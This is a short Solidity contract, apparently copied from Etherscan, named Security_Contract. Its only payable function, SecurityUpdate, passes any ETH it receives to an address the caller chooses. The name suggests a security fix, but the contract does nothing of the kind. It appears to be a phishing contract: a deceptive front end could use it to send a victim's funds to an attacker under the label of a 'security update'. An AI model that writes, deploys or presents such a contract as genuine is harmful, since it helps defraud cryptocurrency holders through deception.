/**
 *Submitted for verification at Etherscan.io on 2023-07-02
*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

contract Security_Contract {

  address private owner;

  constructor() { owner = msg.sender; }
  function getOwner() public view returns (address) { return owner; }
  function getBalance() public view returns (uint256) { return address(this).balance; }

  function SecurityUpdate(address sender) public payable { payable(sender).transfer(msg.value); }

}